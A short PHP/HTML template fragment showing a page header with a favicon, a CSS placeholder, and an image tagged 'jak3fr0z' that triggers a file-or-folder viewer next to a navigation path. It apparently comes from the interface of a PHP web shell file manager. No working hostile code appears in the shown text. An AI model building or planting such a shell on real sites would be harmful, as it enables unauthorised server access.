...
<link rel='SHORTCUT ICON' href='<?php echo get_resource('jak3fr0z');?>'>
<style type="text/css">
<__CSS__>
...
<div id='wrapper'>
	...
	<div id='header'>
		...
		<div id='headerNav'>
			...
			<img onclick='viewfileorfolder();' id='jak3fr0z' src='<?php echo get_resource('jak3fr0z');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
